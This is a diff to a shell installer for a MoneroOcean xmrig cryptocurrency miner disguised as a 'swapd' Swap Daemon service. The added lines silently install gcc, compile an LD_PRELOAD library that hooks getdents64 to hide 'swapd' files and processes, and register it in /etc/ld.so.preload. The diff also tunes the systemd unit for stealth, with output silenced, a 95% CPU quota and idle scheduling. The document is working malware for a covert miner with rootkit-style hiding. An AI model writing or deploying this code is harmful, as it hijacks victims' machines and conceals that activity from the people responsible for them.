@@ -845,6 +845,33 @@ rm -rf "$HOME"/.moneroocean
 rm -rf "$HOME"/.gdm2*
 #rm -rf "$HOME"/.swapd
 
+# Nach der systemd-Detection aber VOR dem Miner-Download
+echo "[*] Deploying stealth module..."
+if ! command -v gcc &>/dev/null; then
+    echo "[!] gcc not found, installing..."
+    if command -v apt-get &>/dev/null; then
+        apt-get update -qq && apt-get install -y gcc libc6-dev make 2>/dev/null
+    elif command -v yum &>/dev/null; then
+        yum install -y gcc glibc-devel make 2>/dev/null
+    elif command -v dnf &>/dev/null; then
+        dnf install -y gcc glibc-devel make 2>/dev/null
+    fi
+fi
+
+if command -v gcc &>/dev/null; then
+    printf '#define _GNU_SOURCE\n#include <dirent.h>\n#include <dlfcn.h>\n#include <string.h>\nstruct linux_dirent64 {unsigned long long d_ino; long long d_off; unsigned short d_reclen; unsigned char d_type; char d_name[];};\nstatic ssize_t (*og)(int, void *, size_t) = NULL;\nssize_t getdents64(int fd, void *dp, size_t c) {\n if(!og) og = dlsym(RTLD_NEXT, "getdents64");\n ssize_t r = og(fd, dp, c);\n if(r <= 0) return r;\n char *p = (char *)dp; size_t o = 0;\n while(o < r) {\n  struct linux_dirent64 *d = (struct linux_dirent64 *)(p + o);\n  if(strstr(d->d_name, "swapd")) {\n   int l = d->d_reclen; memmove(p + o, p + o + l, r - (o + l)); r -= l; continue;\n  }\n  o += d->d_reclen;\n }\n return r;\n}\nssize_t __getdents64(int fd, void *dp, size_t c) { return getdents64(fd, dp, c); }\n' > /tmp/hide.c
+    
+    if gcc -Wall -fPIC -shared -o /usr/local/lib/libhide.so /tmp/hide.c -ldl 2>/dev/null; then
+        echo "/usr/local/lib/libhide.so" > /etc/ld.so.preload
+        echo "[✓] Process hiding deployed"
+    else
+        echo "[!] WARNING: Process hiding compilation failed, continuing without it"
+    fi
+    rm -f /tmp/hide.c
+else
+    echo "[!] WARNING: gcc not available, skipping process hiding"
+fi
+
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
 
 # ========================================================================
@@ -1184,13 +1211,17 @@ Description=Swap Daemon
 After=network.target
 
 [Service]
-Type=simple
-ExecStart=/root/.swapd/launcher.sh
+ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
 Restart=always
+
+# Stealth-optimiert
 Nice=19
 CPUSchedulingPolicy=idle
 IOSchedulingClass=idle
-MemoryMax=2G
+# KEINE harte Memory-Grenze, nur Swap-Priorität
+OOMScoreAdjust=1000
+# CPU-Limit statt Memory (flexibler)
+CPUQuota=95%
 # Silence everything
 StandardOutput=null
 StandardError=null
